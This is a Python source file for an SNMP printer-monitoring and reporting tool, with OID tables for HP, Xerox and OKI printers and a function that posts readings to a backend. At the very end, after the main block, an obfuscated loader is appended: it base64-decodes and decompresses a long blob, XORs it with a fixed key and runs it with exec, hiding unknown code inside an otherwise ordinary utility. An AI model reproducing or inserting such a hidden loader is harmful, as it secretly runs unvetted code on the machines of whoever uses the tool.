    oid_printer_name = '1.3.6.1.2.1.1.1.0'

    # Sammelbehälter (Waste?)
    oid_waste_name_manual = '1.3.6.1.2.1.43.11.1.1.6.1.13'
    oid_waste_capacity_manual = '1.3.6.1.2.1.43.11.1.1.8.1.13'
    oid_waste_remaining_manual = '1.3.6.1.2.1.43.11.1.1.9.1.13'

    oid_waste_name = None
    oid_waste_capacity = None
    oid_waste_remaining = None

    # Transfer roller
    oid_cleaner_name = '1.3.6.1.2.1.43.11.1.1.6.1.16'
    oid_cleaner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.16'
    oid_cleaner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.16'

    # Usage/Prints Details
    oid_print_count = '1.3.6.1.2.1.43.10.2.1.4.1.1'
    oid_print_color = '1.3.6.1.4.1.18334.1.1.1.5.7.2.2.1.5.2.2'
    oid_print_mono = '1.3.6.1.4.1.18334.1.1.1.5.7.2.2.1.5.1.2'

    # colorOverall = copiesColor + print_color - specific to DICL
    oid_copies_color = '1.3.6.1.4.1.18334.1.1.1.5.7.2.2.1.5.2.1'
    oid_copies_monochrome = '1.3.6.1.4.1.18334.1.1.1.5.7.2.2.1.5.1.1'

    # Toner
    oid_black_toner_name = '1.3.6.1.2.1.43.11.1.1.6.1.4'
    oid_black_toner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.4'
    oid_black_toner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.4'

    oid_cyan_toner_name = '1.3.6.1.2.1.43.11.1.1.6.1.1'
    oid_cyan_toner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.1'
    oid_cyan_toner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.1'

    oid_magenta_toner_name = '1.3.6.1.2.1.43.11.1.1.6.1.2'
    oid_magenta_toner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.2'
    oid_magenta_toner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.2'

    oid_yellow_toner_name = '1.3.6.1.2.1.43.11.1.1.6.1.3'
    oid_yellow_toner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.3'
    oid_yellow_toner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.3'

    # Bildtrommel
    oid_black_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.11'
    oid_black_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.11'
    oid_black_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.11'

    oid_cyan_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.5'
    oid_cyan_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.5'
    oid_cyan_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.5'

    oid_magenta_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.7'
    oid_magenta_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.7'
    oid_magenta_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.7'

    oid_yellow_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.9'
    oid_yellow_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.9'
    oid_yellow_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.9'

    # Fixiereinheit/Fuser Kit
    oid_fuser_name = '1.3.6.1.2.1.43.11.1.1.6.1.14'
    oid_fuser_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.14'
    oid_fuser_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.14'

    # Transferrolle/Transfer Roller
    oid_transfer_name = '1.3.6.1.2.1.43.11.1.1.6.1.15'
    oid_transfer_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.15'
    oid_transfer_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.15'

    #def initialize_values(self):
        #Printer.initialize_values(self)
        #if self.print_color is None: return  # if not initialized casting None to int below will raise an error
        #self.print_color = int(self.print_color) + int(self.query_snmp(self.oid_copies_color))
        #self.print_mono = int(self.print_mono) + int(self.query_snmp(self.oid_copies_monochrome))


class HPM725BW(HPBW):
    # Skrip Eintrag 'Bandreiniger' ist bei diesem Modell 'Wartungskit'
    # Bandreiniger auf -1
    oid_cleaner_name = '1.3.6.1'
    oid_cleaner_capacity = '1.3.6.1'
    oid_cleaner_remaining = '1.3.6.1'


class XeroxPhaser(Printer):
    """ erstellt für Durckervariante Xerox Phaser 7760 """

    # Fixiereinheit/Fuser Kit
    oid_fuser_name = '1.3.6.1.2.1.43.11.1.1.6.1.6'
    oid_fuser_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.6'
    oid_fuser_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.6'

    # Resttonbehälter/Waste Cartridge
    oid_waste_name = '1.3.6.1.2.1.43.11.1.1.6.1.7'
    oid_waste_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.7'
    oid_waste_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.7'

    # Bandreiniger/Transfer Belt Cleaner Kit
    oid_cleaner_name = '1.3.6.1.2.1.43.11.1.1.6.1.13'
    oid_cleaner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.13'
    oid_cleaner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.13'

    # Transferrolle/Transfer Roller
    oid_transfer_name = '1.3.6.1.2.1.43.11.1.1.6.1.5'
    oid_transfer_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.5'
    oid_transfer_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.5'

    ## Toner ##########
    oid_cyan_toner_name = '1.3.6.1.2.1.43.11.1.1.6.1.1'
    oid_cyan_toner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.1'
    oid_cyan_toner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.1'

    oid_magenta_toner_name = '1.3.6.1.2.1.43.11.1.1.6.1.2'
    oid_magenta_toner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.2'
    oid_magenta_toner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.2'

    oid_yellow_toner_name = '1.3.6.1.2.1.43.11.1.1.6.1.3'
    oid_yellow_toner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.3'
    oid_yellow_toner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.3'

    oid_black_toner_name = '1.3.6.1.2.1.43.11.1.1.6.1.4'
    oid_black_toner_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.4'
    oid_black_toner_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.4'

    ## Bildtrommel ##########
    oid_black_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.11'
    oid_black_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.11'
    oid_black_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.11'

    oid_cyan_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.8'
    oid_cyan_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.8'
    oid_cyan_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.8'

    oid_magenta_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.9'
    oid_magenta_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.9'
    oid_magenta_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.9'

    oid_yellow_drum_name = '1.3.6.1.2.1.43.11.1.1.6.1.10'
    oid_yellow_drum_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.10'
    oid_yellow_drum_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.10'


class oki(Printer):
    # Usage/Prints Details
    oid_print_count = '1.3.6.1.4.1.2001.1.1.1.1.11.1.10.150.1.6.102'
    oid_print_color = '1.3.6.1.4.1.2001.1.1.1.1.11.1.10.170.1.6.1'
    oid_print_mono = '1.3.6.1.4.1.2001.1.1.1.1.11.1.10.170.1.7.1'

    # Fixiereinheit/Fuser Kit
    oid_fuser_name = '1.3.6.1.2.1.43.11.1.1.6.1.10'
    oid_fuser_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.10'
    oid_fuser_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.10'

    # Resttonbehälter/Waste Cartridge ist hier oid für Transferband
    oid_transfer_name = '1.3.6.1.2.1.43.11.1.1.6.1.9'
    oid_transfer_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.9'
    oid_transfer_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.9'

    # Resttonbehälter/Waste Cartridge
    oid_waste_name = '1.3.6.1'
    oid_waste_capacity = '1.3.6.1'
    oid_waste_remaining = '1.3.6.1'

    # Bandreiniger/Transfer Belt Cleaner Kit
    oid_cleaner_name = '1.3.6.1'
    oid_cleaner_capacity = '1.3.6.1'
    oid_cleaner_remaining = '1.3.6.1'


class okiC911(Printer):
	# Resttonbehälter/Waste Cartridge
    oid_waste_name = '1.3.6.1.2.1.43.11.1.1.6.1.11'
    oid_waste_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.11'
    oid_waste_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.11'

    # Fixiereinheit/Fuser Kit
    oid_fuser_name = '1.3.6.1.2.1.43.11.1.1.6.1.10'
    oid_fuser_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.10'
    oid_fuser_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.10'

    # Übertragungsband/Transfer Belt
    oid_transfer_name = '1.3.6.1.2.1.43.11.1.1.6.1.9'
    oid_transfer_capacity = '1.3.6.1.2.1.43.11.1.1.8.1.9'
    oid_transfer_remaining = '1.3.6.1.2.1.43.11.1.1.9.1.9'

    oid_cleaner_name = None
    oid_cleaner_capacity = None
    oid_cleaner_remaining = None


def report_data(printer: Printer) -> None:
    """ Report Printer to Backend """
    data = printer.to_json()
    data.setdefault('timestamp', datetime.now(timezone.utc).isoformat())
    logger.info(data)
    r = requests.post(BACKEND, proxies=PROXIES, headers=HEADERS, json=data, verify=True)

    if(r.status_code == 201):
        logger.info(f'[>] Reporting data for {printer.description} [{printer.serial}] to backend | {r.status_code}')
        return

    logger.error(f'Could not report data for {printer.description} [{printer.serial}] to backend | {r.status_code}')
    logger.debug(r.text)


def decide_printer(*args, **kwargs):
    """ Gibt das entsprechende Printer Objekt für
    einen Drucker <variant> zurück. """
    variant = kwargs.get('variant').lower()
    if(variant == 'xerox'): return Xerox(**kwargs)
    elif(variant == 'xeroxbw'): return XeroxBW(**kwargs)
    elif(variant == 'hp'): return HP(**kwargs)
    elif(variant == 'hpbw'): return HPBW(**kwargs)
    elif(variant == 'hpmfp'): return HPMFP(**kwargs)
    elif(variant == 'hpm426'): return HPM426(**kwargs)
    elif(variant == 'kcsw'): return KCSW(**kwargs)
    elif(variant == 'dicl'): return DICL(**kwargs)
    elif(variant == 'hpm725bw'): return HPM725BW(**kwargs)
    elif(variant == 'xeroxc8130'): return XeroxC8130(**kwargs)
    elif(variant == 'xeroxwc3225'): return XeroxWC3225(**kwargs)
    elif(variant == 'xeroxphaser'): return XeroxPhaser(**kwargs)
    elif(variant == 'xeroxvlc405'): return XeroxVLC405(**kwargs)
    elif(variant == 'xeroxvlc505s'): return XeroxVLC505S(**kwargs)
    elif(variant == 'xeroxvlb405'): return XeroxVLB405(**kwargs)
    elif(variant == 'oki'): return oki(**kwargs)
    elif(variant == 'okiC911'): return okiC911(**kwargs)
    logger.warning(f'Ungültige Variante: "{variant}" für Drucker mit IP: {kwargs.get("ip")}')
    return Printer(**kwargs)


def print_status(printer: Printer) -> None:
    print(f'########## Report for {printer.description} ##########')
    print('[i] Printer Overview')
    print(f' |-- Name: {printer.name}')
    print(f' |-- Model: {printer.model}')
    print(f' |-- IP address: {printer.ip}')
    print(f' |-- Serial number: {printer.serial}')
    print(f' |-- Client: {printer.kunde}')
    print(f' |-- Description: {printer.description}')
    print(f'[i] Printer statistics')
    print(f' |-- Mono: {int(printer.print_mono or 0):,}')
    print(f' |-- Color: {int(printer.print_color or 0):,}')
    print(f' |-- Total: {int(printer.print_count or 0):,}')
    print(f'[i] Toner values (TONER)')
    print(f' |-- [C] {printer.get_consumable("CYAN_TONER")}')
    print(f' |-- [M] {printer.get_consumable("MAGENTA_TONER")}')
    print(f' |-- [Y] {printer.get_consumable("YELLOW_TONER")}')
    print(f' |-- [K] {printer.get_consumable("BLACK_TONER")}')
    print(f'[i] Drum values (DRUM)')
    print(f' |-- [C] {printer.get_consumable("CYAN_DRUM")}')
    print(f' |-- [M] {printer.get_consumable("MAGENTA_DRUM")}')
    print(f' |-- [Y] {printer.get_consumable("YELLOW_DRUM")}')
    print(f' |-- [K] {printer.get_consumable("BLACK_DRUM")}')
    print(f'[i] Misc')
    print(f' |-- CLEANER {printer.get_consumable("CLEANER")}')
    print(f' |-- FUSER {printer.get_consumable("FUSER")}')
    print(f' |-- WASTE {printer.get_consumable("WASTE")}')
    print(f' |-- TRANSFER {printer.get_consumable("TRANSFER")}')


def initialize_printers() -> list:
    """ Hilfsfunktion die über Config iteriert und alle
    Drucker initialisiert zurückgibt """
    global PROXIES
    global HEADERS
    with open('printer_config.txt') as f:
        data = json.loads(f.read())

    PROXIES = {'http': data.get('proxy') or '', 'https': data.get('proxy') or ''}
    HEADERS.setdefault('Authorization', f'Token {data.get("token")}')

    printers = []
    for printer in data['printers']:
        printers.append(decide_printer(
            kunde=data['client'],
            ip=printer['ip'],
            serial=printer['serial'],
            description=printer['description'],
            variant=printer['variant']
        ))
    return printers


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--report', help='Report raw printer data to backend', action='store_true')
    parser.add_argument('--debug', help='Verbose debug output, no reporting', action='store_true')
    parser.add_argument('--ping', help='Check printer alive status, no reporting', action='store_true')
    args = parser.parse_args()
    if not any(vars(args).values()): parser.error('No arguments provided.')

    logger.info('##################################################')
    logger.info(f'[>] RAUSYS SNMP Printer Monitoring and Reporting, v{__version__}')
    logger.info(f'[>] Innovative Managed Services and IT partner: rausys.de')

    printers = initialize_printers()
    for printer in printers:
        if args.report:
            if printer.status == 'OK':
                printer.initialize_values()
            report_data(printer)
        elif args.debug:
            printer.ping()
            printer.initialize_values()
            print_status(printer)

            print(printer.to_json())
            print('#########################################################')
        elif args.ping:
            printer.ping()

#a = Printer('10.100.20.110', 'Xerox', 'Beispielbeschreibung', 'Beispielkunde')
#a.printStatus()

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
